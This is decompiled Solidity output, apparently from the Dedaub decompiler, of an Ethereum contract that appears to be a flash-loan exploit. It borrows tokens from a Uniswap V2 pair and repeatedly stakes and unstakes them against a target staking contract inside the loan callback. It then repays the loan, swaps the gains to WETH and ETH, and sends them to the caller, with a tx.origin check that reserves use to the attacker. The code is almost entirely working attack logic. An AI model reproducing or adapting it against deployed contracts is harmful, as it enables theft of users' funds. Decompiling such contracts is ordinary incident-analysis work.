// Decompiled by library.dedaub.com
// 2023.12.12 21:45 UTC
// Compiled using the solidity compiler version 0.8.18


// Data structures and variables inferred from the use of storage instructions
uint256 stor_0_0_19; // STORAGE[0x0] bytes 0 to 19
uint256 stor_1_0_19; // STORAGE[0x1] bytes 0 to 19
uint256 stor_2_0_19; // STORAGE[0x2] bytes 0 to 19
uint256 _uniswapV2Call; // STORAGE[0x3] bytes 0 to 19
uint256 stor_4_0_19; // STORAGE[0x4] bytes 0 to 19



function 0x1141(address varg0) private {
    return ;
}

function 0x1177(uint256 varg0) private {
    return ;
}

function _SafeMul(uint256 varg0, uint256 varg1) private {
    require(!varg0 | (varg1 == varg0 * varg1 / varg0), Panic(17)); // arithmetic overflow or underflow
    return varg0 * varg1;
}

function _SafeDiv(uint256 varg0, uint256 varg1) private {
    require(varg1, Panic(18)); // division by zero
    return varg0 / varg1;
}

function function_selector() public payable {
}

function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes _data) public nonPayable {
    require(4 + (msg.data.length - 4) - 4 >= 128);
    0x1141(_sender);
    0x1177(_amount0);
    0x1177(_amount1);
    require(_data <= uint64.max);
    require(4 + _data + 31 < 4 + (msg.data.length - 4));
    require(_data.length <= uint64.max);
    require(_data.data + _data.length <= 4 + (msg.data.length - 4));
    if (32 < 32) {
        v0 = v1 = uint256(v0);
    }
    require(keccak256(keccak256(address(tx.origin))) == v0);
    require(_data.data + _data.length - _data.data >= 32);
    0x1177(_data[0]);
    v2, /* bool */ v3 = _uniswapV2Call.approve(stor_2_0_19, uint256.max).gas(msg.gas);
    require(bool(v2), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v3 == bool(v3));
    v4, /* bool */ v5 = stor_4_0_19.approve(stor_2_0_19, uint256.max).gas(msg.gas);
    require(bool(v4), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v5 == bool(v5));
    v6 = v7 = 0;
    while (v6 < _data[0]) {
        v8, /* uint256 */ v9 = _uniswapV2Call.balanceOf(address(this)).gas(msg.gas);
        require(bool(v8), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        0x1177(v9);
        require(bool(stor_2_0_19.code.size));
        v10 = stor_2_0_19.stake(address(this), v9).gas(msg.gas);
        require(bool(v10), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        v11, /* uint256 */ v12 = stor_4_0_19.balanceOf(address(this)).gas(msg.gas);
        require(bool(v11), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        0x1177(v12);
        require(bool(stor_2_0_19.code.size));
        v13 = stor_2_0_19.unstake(address(this), v12, True).gas(msg.gas);
        require(bool(v13), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        require(v6 - uint256.max, Panic(17)); // arithmetic overflow or underflow
        v6 = v6 + 1;
    }
    if (_amount0 == 0) {
        v14 = _SafeMul(_amount1, 10031);
        v15 = _SafeDiv(v14, 10000);
    } else {
        v16 = _SafeMul(_amount0, 10031);
        v15 = v17 = _SafeDiv(v16, 10000);
    }
    v18, /* bool */ v19 = _uniswapV2Call.transfer(msg.sender, v15).gas(msg.gas);
    require(bool(v18), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v19 == bool(v19));
}

function 0x8d9410de(address varg0, address varg1, address varg2, address varg3, uint256 varg4) public payable {
    require(4 + (msg.data.length - 4) - 4 >= 160);
    0x1141(varg0);
    0x1141(varg1);
    0x1141(varg2);
    0x1141(varg3);
    0x1177(varg4);
    if (32 < 32) {
        v0 = v1 = uint256(v0);
    }
    require(keccak256(keccak256(address(tx.origin))) == v0);
    stor_2_0_19 = varg1;
    _uniswapV2Call = varg2;
    stor_4_0_19 = varg3;
    v2, /* address */ v3 = varg0.token0().gas(msg.gas);
    require(bool(v2), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    0x1141(v3);
    if (address(v3) - varg2) {
        v4, /* uint256 */ v5 = varg2.balanceOf(varg0).gas(msg.gas);
        require(bool(v4), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        0x1177(v5);
        v6 = _SafeMul(v5, 7);
        v7 = _SafeDiv(v6, 10);
        v8 = new uint256[](32);
        v9 = v10 = 0;
        while (v9 < 32) {
            MEM[v8.data + v9] = MEM[MEM[64] + 32 + v9];
            v9 = v9 + 32;
        }
        MEM[v8.data + 32] = 0;
        require(bool((address(varg0)).code.size));
        v11 = varg0.swap(0, v7, address(this), v8, v12, varg4).gas(msg.gas);
        require(bool(v11), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    } else {
        v13, /* uint256 */ v14 = varg2.balanceOf(varg0).gas(msg.gas);
        require(bool(v13), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        0x1177(v14);
        v15 = _SafeMul(v14, 7);
        v16 = _SafeDiv(v15, 10);
        v17 = new uint256[](32);
        v18 = v19 = 0;
        while (v18 < 32) {
            MEM[v17.data + v18] = MEM[MEM[64] + 32 + v18];
            v18 = v18 + 32;
        }
        MEM[v17.data + 32] = 0;
        require(bool((address(varg0)).code.size));
        v20 = varg0.swap(v16, 0, address(this), v17, v12, varg4).gas(msg.gas);
        require(bool(v20), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    }
    v21, /* uint256 */ v22 = varg2.balanceOf(address(this)).gas(msg.gas);
    require(bool(v21), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    0x1177(v22);
    v23, /* bool */ v24 = varg2.approve(stor_0_0_19, uint256.max).gas(msg.gas);
    require(bool(v23), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v24 == bool(v24));
    require(2 <= uint64.max, Panic(65)); // failed memory allocation (too much memory)
    v25 = new address[](2);
    if (2) {
        CALLDATACOPY(v25.data, msg.data.length, 64);
    }
    require(0 < v25.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
    v26 = v25.data;
    v25[0] = varg2;
    require(1 < v25.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
    v25[1] = address(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2);
    v27 = new address[](v25.length);
    v28 = v29 = v27.data;
    v30 = v31 = v25.data;
    v32 = v33 = 0;
    while (v32 < v25.length) {
        MEM[v28] = address(MEM[v30]);
        v28 = v28 + 32;
        v30 = v30 + 32;
        v32 = v32 + 1;
    }
    require(bool(stor_1_0_19.code.size));
    v34 = stor_1_0_19.swapExactTokensForTokensSupportingFeeOnTransferTokens(v22, 0, v27, address(this), block.timestamp, v12, varg2).gas(msg.gas);
    require(bool(v34), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    v35, /* uint256 */ v36 = address(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2).balanceOf(address(this)).gas(msg.gas);
    require(bool(v35), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    0x1177(v36);
    require(bool((address(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)).code.size));
    v37 = address(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2).withdraw(v36).gas(msg.gas);
    require(bool(v37), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    v38, /* uint256 */ v39 = msg.sender.call().value(this.balance).gas(msg.gas);
    if (RETURNDATASIZE() != 0) {
        v40 = new bytes[](RETURNDATASIZE());
        RETURNDATACOPY(v40.data, 0, RETURNDATASIZE());
    }
}

function 0xda9100cc(address varg0) public nonPayable {
    require(4 + (msg.data.length - 4) - 4 >= 32);
    0x1141(varg0);
    if (32 < 32) {
        v0 = v1 = uint256(v0);
    }
    require(keccak256(keccak256(address(tx.origin))) == v0);
    if (varg0 - address(0x0)) {
        v2, /* uint256 */ v3 = varg0.balanceOf(address(this)).gas(msg.gas);
        require(bool(v2), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        0x1177(v3);
        v4, /* bool */ v5 = varg0.transfer(msg.sender, v3).gas(msg.gas);
        require(bool(v4), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v5 == bool(v5));
    } else {
        v6 = msg.sender.call().value(this.balance).gas(!this.balance * 2300);
        require(bool(v6), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    }
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function function_selector( function_selector) public payable {
    MEM[64] = 128;
    if (msg.data.length < 4) {
        require(!msg.data.length);
        ();
    } else if (0x10d1e85c == function_selector >> 224) {
        uniswapV2Call(address,uint256,uint256,bytes);
    } else if (0x8d9410de == function_selector >> 224) {
        0x8d9410de();
    } else {
        require(0xda9100cc == function_selector >> 224);
        0xda9100cc();
    }
}

